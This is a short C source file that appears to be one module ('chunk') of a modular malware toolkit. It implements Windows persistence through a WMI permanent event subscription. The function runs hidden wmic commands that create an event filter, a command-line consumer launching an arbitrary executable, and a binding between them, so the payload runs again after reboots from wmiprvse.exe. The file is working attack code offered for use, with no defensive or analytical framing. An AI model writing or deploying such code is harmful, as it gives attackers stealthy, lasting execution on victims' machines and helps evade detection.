// chunk: persist/wmi_subscription
// depends: (none)
// provides: persist_wmi_subscription
// headers: windows.h
// libs: ole32, oleaut32
// note: WMI permanent event subscription — survives reboots, triggers from wmiprvse.exe

#ifndef CHUNK_PERSIST_WMI_SUB
#define CHUNK_PERSIST_WMI_SUB

static int persist_wmi_subscription(const char *exe_path, const char *name) {
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        "wmic /namespace:\\\\root\\subscription PATH __EventFilter "
        "CREATE Name=\"%s\", EventNameSpace=\"root\\cimv2\", "
        "QueryLanguage=\"WQL\", "
        "Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"",
        name);

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    snprintf(cmd, sizeof(cmd),
        "wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer "
        "CREATE Name=\"%s\", CommandLineTemplate=\"%s\"",
        name, exe_path);

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    snprintf(cmd, sizeof(cmd),
        "wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding "
        "CREATE Filter=\"__EventFilter.Name=\\\"%s\\\"\", "
        "Consumer=\"CommandLineEventConsumer.Name=\\\"%s\\\"\"",
        name, name);

    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return 0;
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 1;
}

#endif
